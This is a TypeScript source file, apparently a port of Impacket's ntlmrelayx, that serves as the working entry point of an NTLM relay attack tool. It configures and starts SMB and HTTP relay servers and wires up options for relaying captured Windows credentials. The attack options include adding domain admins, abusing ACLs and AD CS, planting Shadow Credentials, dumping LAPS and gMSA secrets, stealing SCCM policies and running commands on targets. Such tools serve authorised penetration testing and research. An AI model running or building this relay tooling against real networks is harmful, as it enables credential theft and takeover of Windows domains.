#!/usr/bin/env node
/**
 * jspacket - ntlmrelayx
 *
 * Generic NTLM Relay Module.
 *
 * This module performs the SMB Relay attacks originally discovered by cDc,
 * extended to many target protocols (SMB, MSSQL, LDAP, etc). It receives a
 * list of targets and, for every connection received, it chooses the next
 * target and tries to relay the credentials.
 *
 * Python implementation by Alberto Solino (@agsolino),
 * Dirk-jan Mollema / Fox-IT and Sylvain Heiniger / Compass Security.
 * TypeScript port.
 */

import { parseArgs } from 'node:util';
import * as readline from 'node:readline';
import { URL } from 'node:url';
import {
  init as initLogger,
  info,
  error as logError,
  warning,
  normalizeArgs,
  BANNER,
  initProxy,
  setReadline,
} from '@impacket/examples';
import {
  NTLMRelayxConfig,
  TargetsProcessor,
  TargetsFileWatcher,
  SMBRelayClient,
  SMBRelayServer,
  SMBAttack,
  HTTPRelayServer,
} from './ntlmrelayx/index.js';
import type { ProtocolClientConstructor, ProtocolAttackConstructor } from './ntlmrelayx/config.js';


// ---------------------------------------------------------------------------
// parse_listening_ports  (port of utils/config.py:parse_listening_ports)
// ---------------------------------------------------------------------------
// Accepts a comma-separated list of ports and port ranges, e.g. "80,8000-8010".
function parseListeningPorts(value: string): number[] {
  const ports = new Set<number>();
  for (const chunk of value.split(',')) {
    const part = chunk.trim();
    if (part === '') continue;
    if (part.includes('-')) {
      const [loStr, hiStr] = part.split('-');
      const lo = Number(loStr);
      const hi = Number(hiStr);
      if (!Number.isInteger(lo) || !Number.isInteger(hi) || lo > hi) {
        throw new Error(`Invalid port range: ${part}`);
      }
      for (let p = lo; p <= hi; p++) ports.add(p);
    } else {
      const p = Number(part);
      if (!Number.isInteger(p)) throw new Error(`Invalid port: ${part}`);
      ports.add(p);
    }
  }
  return [...ports];
}

// ---------------------------------------------------------------------------
// Usage
// ---------------------------------------------------------------------------
function usage(): never {
  console.log(`For every connection received, this module will try to relay that connection
to specified target(s) system or the original client.

usage: ntlmrelayx [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE] [-w]
                  [-i] [-ip INTERFACE_IP] [--no-smb-server] [--no-http-server]
                  [--no-wcf-server] [--no-raw-server] [--no-rpc-server]
                  [--no-winrm-server] [--no-mssql-server] [--no-rdp-server]
                  [--smb-port SMB_PORT] [--http-port HTTP_PORT]
                  [--wcf-port WCF_PORT] [--raw-port RAW_PORT]
                  [--rpc-port RPC_PORT] [--mssql-port MSSQL_PORT]
                  [--rdp-port RDP_PORT] [--no-multirelay] [--keep-relaying]
                  [-ra] [-r SMBSERVER] [-l LOOTDIR] [-of OUTPUT_FILE] [-dh]
                  [-codec CODEC] [-smb2support] [-ntlmchallenge NTLMCHALLENGE]
                  [-socks] [-socks-address SOCKS_ADDRESS]
                  [-socks-port SOCKS_PORT] [-http-api-port HTTP_API_PORT]
                  [-wh WPAD_HOST] [-wa WPAD_AUTH_NUM] [-6] [--remove-mic]
                  [--remove-sign-seal] [--serve-image SERVE_IMAGE] [-c COMMAND]
                  [--mssql-db MSSQL_DB] [-e FILE] [--enum-local-admins]
                  [--rpc-attack {TSCH,ICPR}] [-rpc-mode {TSCH,ICPR}]
                  [-rpc-use-smb] [-auth-smb CREDS] [-hashes-smb LMHASH:NTHASH]
                  [-rpc-smb-port {139,445}] [-icpr-ca-name ICPR_CA_NAME]
                  [-q QUERY] [-machine-account MACHINE_ACCOUNT]
                  [-machine-hashes LMHASH:NTHASH] [-domain DOMAIN]
                  [-remove-target] [--https] [--certfile FILE] [--keyfile FILE]
                  [--no-dump] [--no-da] [--no-acl] [--no-validate-privs]
                  [--escalate-user USER] [--delegate-access] [--sid]
                  [--dump-laps] [--dump-gmsa] [--dump-adcs] [--dump-info-attr]
                  [--dump-pre2k] [--add-dns-record NAME IPADDR]
                  [--add-computer [NAME [PASSWORD]]] [-k KEYWORD] [-m MAILBOX]
                  [-a] [-im IMAP_MAX] [--adcs] [--template TEMPLATE]
                  [--altname ALTNAME] [--altsid SID] [--enum-templates]
                  [--shadow-credentials] [--shadow-target SHADOW_TARGET]
                  [--pfx-password PFX_PASSWORD] [--export-type {PEM,PFX}]
                  [--cert-outfile-path PATH] [--sccm-policies]
                  [--sccm-policies-clientname NAME] [--sccm-policies-sleep N]
                  [--sccm-dp] [--sccm-dp-extensions EXTS] [--sccm-dp-files FILE]
`);
  process.exit(1);
}

// ---------------------------------------------------------------------------
// Coalesce two argparse spellings (short two-letter form vs --long form) that
// map to a single impacket dest. parseArgs has no alias support, so we accept
// both keys and take whichever the user supplied.
// ---------------------------------------------------------------------------
function pick<T>(a: T | undefined, b: T | undefined): T | undefined {
  return a !== undefined ? a : b;
}

async function main(): Promise<void> {
  const args = normalizeArgs(process.argv.slice(2));

  let parsed;
  try {
    parsed = parseArgs({
      args,
      allowPositionals: true,
      options: {
        help: { type: 'boolean', short: 'h', default: false },
        ts: { type: 'boolean', default: false },
        debug: { type: 'boolean', default: false },
        proxy: { type: 'string' },

        // -t / --target
        target: { type: 'string', short: 't' },
        tf: { type: 'string' },
        w: { type: 'boolean', default: false },
        i: { type: 'boolean' },
        interactive: { type: 'boolean' },

        // -ip / --interface-ip
        ip: { type: 'string' },
        'interface-ip': { type: 'string' },

        'no-smb-server': { type: 'boolean', default: false },
        'no-http-server': { type: 'boolean', default: false },
        'no-wcf-server': { type: 'boolean', default: false },
        'no-raw-server': { type: 'boolean', default: false },
        'no-rpc-server': { type: 'boolean', default: false },
        'no-winrm-server': { type: 'boolean', default: false },
        'no-mssql-server': { type: 'boolean', default: false },
        'no-rdp-server': { type: 'boolean', default: false },

        'smb-port': { type: 'string', default: '445' },
        'http-port': { type: 'string', default: '80' },
        'wcf-port': { type: 'string', default: '9389' },
        'raw-port': { type: 'string', default: '6666' },
        'rpc-port': { type: 'string', default: '135' },
        'mssql-port': { type: 'string', default: '1433' },
        'rdp-port': { type: 'string', default: '3389' },

        'no-multirelay': { type: 'boolean', default: false },
        'keep-relaying': { type: 'boolean', default: false },

        // -ra / --random
        ra: { type: 'boolean' },
        random: { type: 'boolean' },

        r: { type: 'string' },

        // -l / --lootdir
        l: { type: 'string' },
        lootdir: { type: 'string' },

        // -of / --output-file
        of: { type: 'string' },
        'output-file': { type: 'string' },

        // -dh / --dump-hashes
        dh: { type: 'boolean' },
        'dump-hashes': { type: 'boolean' },

        codec: { type: 'string' },
        smb2support: { type: 'boolean', default: false },
        ntlmchallenge: { type: 'string' },
        socks: { type: 'boolean', default: false },
        'socks-address': { type: 'string', default: '127.0.0.1' },
        'socks-port': { type: 'string', default: '1080' },
        'http-api-port': { type: 'string', default: '9090' },

        // -wh / --wpad-host
        wh: { type: 'string' },
        'wpad-host': { type: 'string' },

        // -wa / --wpad-auth-num
        wa: { type: 'string' },
        'wpad-auth-num': { type: 'string' },

        // -6 / --ipv6
        '6': { type: 'boolean' },
        ipv6: { type: 'boolean' },

        'remove-mic': { type: 'boolean', default: false },
        'remove-sign-seal': { type: 'boolean', default: false },
        'serve-image': { type: 'string' },
        c: { type: 'string' },
        'mssql-db': { type: 'string' },

        // SMB client options
        e: { type: 'string' },
        'enum-local-admins': { type: 'boolean', default: false },
        'rpc-attack': { type: 'string' },

        // RPC client options
        'rpc-mode': { type: 'string', default: 'TSCH' },
        'rpc-use-smb': { type: 'boolean', default: false },
        'auth-smb': { type: 'string', default: '' },
        'hashes-smb': { type: 'string' },
        'rpc-smb-port': { type: 'string', default: '445' },
        'icpr-ca-name': { type: 'string', default: '' },

        // MSSQL client options (-q / --query, append)
        q: { type: 'string', multiple: true },
        query: { type: 'string', multiple: true },

        // HTTP options
        'machine-account': { type: 'string' },
        'machine-hashes': { type: 'string' },
        domain: { type: 'string' },
        'remove-target': { type: 'boolean', default: false },
        https: { type: 'boolean', default: false },
        certfile: { type: 'string' },
        keyfile: { type: 'string' },

        // LDAP options
        'no-dump': { type: 'boolean' },
        'no-da': { type: 'boolean' },
        'no-acl': { type: 'boolean' },
        'no-validate-privs': { type: 'boolean' },
        'escalate-user': { type: 'string' },
        'delegate-access': { type: 'boolean', default: false },
        sid: { type: 'boolean', default: false },
        'dump-laps': { type: 'boolean', default: false },
        'dump-gmsa': { type: 'boolean', default: false },
        'dump-adcs': { type: 'boolean', default: false },
        'dump-info-attr': { type: 'boolean', default: false },
        'dump-pre2k': { type: 'boolean', default: false },
        'add-dns-record': { type: 'string', multiple: true },

        // Common SMB/LDAP
        'add-computer': { type: 'string', multiple: true },

        // IMAP options
        k: { type: 'string', default: 'password' },
        keyword: { type: 'string' },
        m: { type: 'string', default: 'INBOX' },
        mailbox: { type: 'string' },
        a: { type: 'boolean', default: false },
        all: { type: 'boolean' },
        im: { type: 'string', default: '0' },
        'imap-max': { type: 'string' },

        // AD CS options
        adcs: { type: 'boolean', default: false },
        template: { type: 'string' },
        altname: { type: 'string' },
        altsid: { type: 'string' },
        'enum-templates': { type: 'boolean', default: false },

        // Shadow Credentials options
        'shadow-credentials': { type: 'boolean', default: false },
        'shadow-target': { type: 'string' },
        'pfx-password': { type: 'string' },
        'export-type': { type: 'string', default: 'PFX' },
        'cert-outfile-path': { type: 'string' },

        // SCCM policies options
        'sccm-policies': { type: 'boolean', default: false },
        'sccm-policies-clientname': { type: 'string' },
        'sccm-policies-sleep': { type: 'string' },

        // SCCM DP options
        'sccm-dp': { type: 'boolean', default: false },
        'sccm-dp-extensions': { type: 'string' },
        'sccm-dp-files': { type: 'string' },
      },
    });
  } catch (e) {
    logError((e as Error).message);
    process.exit(1);
  }

  const { values } = parsed;
  if (values.help) usage();

  initProxy(values.proxy as string | undefined);

  // Coalesce dual-spelled flags into their impacket dest.
  const opt = {
    ts: values.ts as boolean,
    debug: values.debug as boolean,
    target: values.target as string | undefined,
    tf: values.tf as string | undefined,
    w: values.w as boolean,
    interactive: (pick(values.i, values.interactive) as boolean) ?? false,
    interfaceIp: pick(values.ip, values['interface-ip']) as string | undefined,
    random: (pick(values.ra, values.random) as boolean) ?? false,
    r: values.r as string | undefined,
    lootdir: (pick(values.l, values.lootdir) as string | undefined) ?? '.',
    outputFile: pick(values.of, values['output-file']) as string | undefined,
    dumpHashes: (pick(values.dh, values['dump-hashes']) as boolean) ?? false,
    codec: values.codec as string | undefined,
    ntlmchallenge: values.ntlmchallenge as string | undefined,
    socks: values.socks as boolean,
    socksAddress: values['socks-address'] as string,
    socksPort: Number(values['socks-port']),
    httpApiPort: Number(values['http-api-port']),
    wpadHost: pick(values.wh, values['wpad-host']) as string | undefined,
    wpadAuthNum: Number(pick(values.wa, values['wpad-auth-num']) ?? '1'),
    ipv6: (pick(values['6'], values.ipv6) as boolean) ?? false,
    smb2support: values.smb2support as boolean,
    rpcUseSmb: values['rpc-use-smb'] as boolean,
    authSmb: values['auth-smb'] as string,
    https: values.https as boolean,
    certfile: values.certfile as string | undefined,
    addComputer: values['add-computer'] as string[] | undefined,
    addDnsRecord: values['add-dns-record'] as string[] | undefined,
    sccmPolicies: values['sccm-policies'] as boolean,
    sccmDp: values['sccm-dp'] as boolean,
    query: pick(values.q, values.query) as string[] | undefined,
  };

  // --- argument validation (ported from __main__) ---------------------------

  if (opt.https && opt.certfile === undefined) {
    logError('--https requires --certfile');
    process.exit(1);
  }

  if (opt.rpcUseSmb && !opt.authSmb) {
    logError('Set -auth-smb to relay DCE/RPC to SMB pipes');
    process.exit(1);
  }

  if (opt.sccmPolicies && opt.target) {
    const t = opt.target.replace(/\/+$/, '');
    if (!t.endsWith('/ccm_system_windowsauth/request')) {
      logError('When performing SCCM policies attack, the Management Point authenticated device registration endpoint should be provided as target');
      try {
        const u = new URL(opt.target);
        logError(`For instance: ${u.protocol}//${u.host}/ccm_system_windowsauth/request`);
      } catch { /* ignore */ }
      process.exit(1);
    }
  }

  if (opt.sccmDp && opt.target) {
    const t = opt.target.replace(/\/+$/, '');
    if (!t.endsWith('/sms_dp_smspkg$/Datalib')) {
      logError('When performing SCCM DP attack, the Distribution Point Datalib endpoint should be provided as target');
      try {
        const u = new URL(opt.target);
        logError(`For instance: ${u.protocol}//${u.host}/sms_dp_smspkg$/Datalib`);
      } catch { /* ignore */ }
      process.exit(1);
    }
  }

  // Init logger + banner
  initLogger({ ts: opt.ts, debug: opt.debug });
  console.log(`${BANNER}\n`);

  if (opt.addDnsRecord) {
    const dnsName = (opt.addDnsRecord[0] ?? '').toLowerCase();
    if (dnsName === 'wpad' || dnsName === '*') {
      warning('You are asking to add a `wpad` or a wildcard DNS name. This can cause disruption in larger networks (using multiple DNS subdomains) or if workstations already use a proxy config.');
    }
  }

  const codec = opt.codec ?? 'utf-8';

  // --- protocol client / attack registry -----------------------------------
  const PROTOCOL_CLIENTS: Record<string, ProtocolClientConstructor> = {
    SMB: SMBRelayClient as any,
  };
  const PROTOCOL_ATTACKS: Record<string, ProtocolAttackConstructor> = {
    SMB: SMBAttack as any,
  };

  // --- mode / targets selection --------------------------------------------
  let mode: 'RELAY' | 'REFLECTION';
  let targetSystem: TargetsProcessor | null;
  let noMultirelay = values['no-multirelay'] as boolean;

  if (opt.target !== undefined) {
    info('Running in relay mode to single host');
    mode = 'RELAY';
    targetSystem = new TargetsProcessor({
      singleTarget: opt.target,
      protocolClients: PROTOCOL_CLIENTS,
      randomize: opt.random,
    });
    if (targetSystem.generalCandidates.length > 0) noMultirelay = true;
  } else if (opt.tf !== undefined) {
    if (opt.addComputer) {
      info('To add a machine account through SMB only the Domain Controller must be specified as target');
      process.exit(1);
    }
    info('Running in relay mode to hosts in targetfile');
    targetSystem = new TargetsProcessor({
      targetListFile: opt.tf,
      protocolClients: PROTOCOL_CLIENTS,
      randomize: opt.random,
    });
    mode = 'RELAY';
  } else {
    info('Running in reflection mode');
    targetSystem = null;
    mode = 'REFLECTION';
  }

  // --- server list assembly (ported from __main__) --------------------------
  const relayServers: string[] = [];
  if (!values['no-smb-server']) relayServers.push('SMBRelayServer');
  if (!values['no-http-server']) {
    relayServers.push('HTTPRelayServer');
    try {
      parseListeningPorts(values['http-port'] as string);
    } catch {
      logError('Incorrect specification of port range for HTTP server');
      process.exit(1);
    }
    if (opt.r !== undefined) info('Running HTTP server in redirect mode');
  }
  if (!values['no-wcf-server']) relayServers.push('WCFRelayServer');
  if (!values['no-raw-server']) relayServers.push('RAWRelayServer');
  if (!values['no-winrm-server']) {
    relayServers.push('WinRMRelayServer');
    relayServers.push('WinRMSRelayServer');
  }
  if (!values['no-rpc-server']) relayServers.push('RPCRelayServer');
  if (!values['no-mssql-server']) relayServers.push('MSSQLRelayServer');
  if (!values['no-rdp-server']) relayServers.push('RDPRelayServer');

  if (!opt.interfaceIp) {
    opt.interfaceIp = opt.ipv6 ? '::' : '0.0.0.0';
  }

  if (noMultirelay) info('Multirelay disabled');
  else info('Multirelay enabled');

  // --- build NTLMRelayxConfig from parsed args --------------------------------
  const config = new NTLMRelayxConfig();
  config.interfaceIp = opt.interfaceIp ?? null;
  config.mode = mode;
  config.outputFile = opt.outputFile ?? null;
  config.dumpHashes = opt.dumpHashes;
  config.encoding = codec;
  config.ipv6 = opt.ipv6;
  config.smb2support = opt.smb2support;
  config.interactive = opt.interactive;
  config.command = values.c as string | undefined ?? null;
  config.exeFile = values.e as string | undefined ?? null;
  config.enumLocalAdmins = values['enum-local-admins'] as boolean;
  config.lootdir = opt.lootdir;
  config.redirecthost = opt.r ?? null;
  config.disableMulti = noMultirelay;
  config.keepRelaying = values['keep-relaying'] as boolean;
  config.SMBServerChallenge = opt.ntlmchallenge ?? null;
  config.runSocks = opt.socks;
  config.https = opt.https;
  config.certfile = opt.certfile ?? null;
  config.keyfile = values.keyfile as string | undefined ?? null;
  config.machineAccount = values['machine-account'] as string | undefined ?? null;
  config.machineHashes = values['machine-hashes'] as string | undefined ?? null;
  config.domainIp = values.domain as string | undefined ?? null;
  config.randomtargets = opt.random;
  config.serve_wpad = opt.w;
  config.wpad_host = opt.wpadHost ?? null;
  config.wpad_auth_num = opt.wpadAuthNum;
  config.serve_image = !!(values['serve-image'] as string | undefined);
  config.isADCSAttack = values.adcs as boolean;
  config.template = values.template as string | undefined ?? null;
  config.altName = values.altname as string | undefined ?? null;
  config.altSid = values.altsid as string | undefined ?? null;
  config.enumTemplates = values['enum-templates'] as boolean;
  config.IsShadowCredentialsAttack = values['shadow-credentials'] as boolean;
  config.ShadowCredentialsTarget = values['shadow-target'] as string | undefined ?? null;
  config.ShadowCredentialsPFXPassword = values['pfx-password'] as string | undefined ?? null;
  config.ShadowCredentialsExportType = values['export-type'] as string | undefined ?? null;
  config.ShadowCredentialsOutfilePath = values['cert-outfile-path'] as string | undefined ?? null;
  config.rpc_attack = values['rpc-attack'] as string | undefined ?? null;
  config.rpc_mode = values['rpc-mode'] as string ?? 'TSCH';
  config.rpc_use_smb = opt.rpcUseSmb;
  config.auth_smb = opt.authSmb;
  config.port_smb = Number(values['rpc-smb-port'] ?? 445);
  config.queries = opt.query ?? [];
  config.database = values['mssql-db'] as string | undefined ?? null;

  if (values['hashes-smb']) {
    const parts = (values['hashes-smb'] as string).split(':');
    config.smblmhash = parts[0] ?? '';
    config.smbnthash = parts[1] ?? '';
  }

  config.setExploitOptions(
    values['remove-mic'] as boolean,
    values['remove-target'] as boolean,
    values['remove-sign-seal'] as boolean,
  );

  config.setLDAPOptions({
    dumpdomain: !(values['no-dump'] as boolean | undefined),
    addda: !(values['no-da'] as boolean | undefined),
    aclattack: !(values['no-acl'] as boolean | undefined),
    validateprivs: !(values['no-validate-privs'] as boolean | undefined),
    escalateuser: values['escalate-user'] as string | undefined ?? null,
    addcomputer: opt.addComputer ?? null,
    delegateaccess: values['delegate-access'] as boolean,
    dumplaps: values['dump-laps'] as boolean,
    dumpgmsa: values['dump-gmsa'] as boolean,
    dumpadcs: values['dump-adcs'] as boolean,
    sid: values.sid as boolean,
    adddnsrecord: opt.addDnsRecord ?? null,
    dumpinfoattr: values['dump-info-attr'] as boolean,
    dumppre2k: values['dump-pre2k'] as boolean,
  });

  config.setProtocolClients(PROTOCOL_CLIENTS);
  config.setAttacks(PROTOCOL_ATTACKS);
  if (targetSystem) config.setTargets(targetSystem);

  // --- start relay servers ---------------------------------------------------
  const activeServers: Array<SMBRelayServer | HTTPRelayServer> = [];
  let targetWatcher: TargetsFileWatcher | null = null;

  if (targetSystem?.filename) {
    targetWatcher = new TargetsFileWatcher(targetSystem);
    targetWatcher.start();
  }

  for (const serverName of relayServers) {
    switch (serverName) {
      case 'SMBRelayServer': {
        const smbPort = Number(values['smb-port'] ?? 445);
        config.listeningPort = smbPort;
        const srv = new SMBRelayServer(config);
        try {
          await srv.start();
          activeServers.push(srv);
        } catch (e: any) {
          logError(`SMB Server on port ${smbPort} failed: ${e.code === 'EACCES' ? 'permission denied (port in use or requires admin)' : e.message}`);
        }
        break;
      }
      case 'HTTPRelayServer': {
        const httpPorts = parseListeningPorts(values['http-port'] as string);
        for (const port of httpPorts) {
          const httpConfig = new NTLMRelayxConfig();
          Object.assign(httpConfig, config);
          httpConfig.listeningPort = port;
          const srv = new HTTPRelayServer(httpConfig);
          try {
            await srv.start();
            activeServers.push(srv);
          } catch (e: any) {
            logError(`HTTP Server on port ${port} failed: ${e.code === 'EACCES' ? 'permission denied (port in use or requires admin)' : e.message}`);
          }
        }
        break;
      }
      default:
        info(`${serverName} not yet implemented — skipping`);
        break;
    }
  }

  if (activeServers.length === 0) {
    logError('No relay servers started. Nothing to do.');
    process.exit(1);
  }

  if (opt.socks) {
    info('SOCKS proxy not yet implemented in jspacket — relaying will work but no SOCKS proxy is available');
  }

  info(`Servers started, waiting for connections`);

  // --- MiniShell (stdin command loop) ----------------------------------------
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  rl.setPrompt('ntlmrelayx> ');
  setReadline(rl);
  rl.prompt();

  rl.on('line', (line: string) => {
    const cmd = line.trim().toLowerCase();
    if (cmd === 'exit' || cmd === 'quit' || cmd === 'q') {
      info('Shutting down...');
      for (const srv of activeServers) srv.stop();
      targetWatcher?.stop();
      rl.close();
      process.exit(0);
    } else if (cmd === 'targets') {
      if (targetSystem) {
        info(`Remaining general targets: ${targetSystem.generalCandidates.length}`);
        info(`Remaining named targets: ${targetSystem.namedCandidates.length}`);
        info(`Finished attacks: ${targetSystem.finishedAttacks.length}`);
        info(`Failed attacks: ${targetSystem.failedAttacks.length}`);
      } else {
        info('Running in reflection mode — no targets');
      }
    } else if (cmd === 'socks') {
      info('SOCKS proxy not yet implemented');
    } else if (cmd === 'help' || cmd === '?') {
      console.log('Available commands:');
      console.log('  targets  - Show remaining/finished/failed targets');
      console.log('  socks    - Show SOCKS connections (not implemented)');
      console.log('  exit     - Shut down relay servers');
    } else if (cmd !== '') {
      console.log(`Unknown command: ${cmd}. Type 'help' for available commands.`);
    }
    rl.prompt();
  });

  rl.on('close', () => {
    setReadline(null);
    for (const srv of activeServers) srv.stop();
    targetWatcher?.stop();
  });
}

main().catch((e) => {
  logError((e as Error).stack ?? String(e));
  process.exit(1);
});
